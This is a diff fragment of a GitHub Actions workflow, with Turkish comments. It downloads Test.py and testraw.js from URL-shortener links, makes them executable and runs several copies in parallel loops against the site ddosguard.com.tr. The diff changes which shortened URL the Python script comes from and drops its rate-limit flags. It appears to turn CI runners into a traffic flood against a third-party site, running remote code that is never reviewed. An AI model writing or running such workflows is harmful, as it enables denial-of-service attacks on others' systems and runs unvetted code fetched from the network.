@@ -21,7 +21,7 @@ jobs:
           
       - name: Download scripts
         run: |
-          wget https://curl.by/sSwco/Test.py -O Test.py
+          wget https://curl.by/9zqQt/Test.py -O Test.py
           wget https://curl.by/DT6Ey/testraw.js -O testraw.js
           chmod +x testraw.js Test.py
           
@@ -34,7 +34,7 @@ jobs:
           # 4 paralel döngü
           for i in {1..4}; do
             # Python script (200 saniye timeout)
-            timeout 200 python3 Test.py https://ddosguard.com.tr/ --concurrency 2 --rpm 30 --headless &
+            timeout 200 python3 Test.py https://ddosguard.com.tr/
             PIDS+=($!)
             
             # Node.js script (200 saniye timeout)
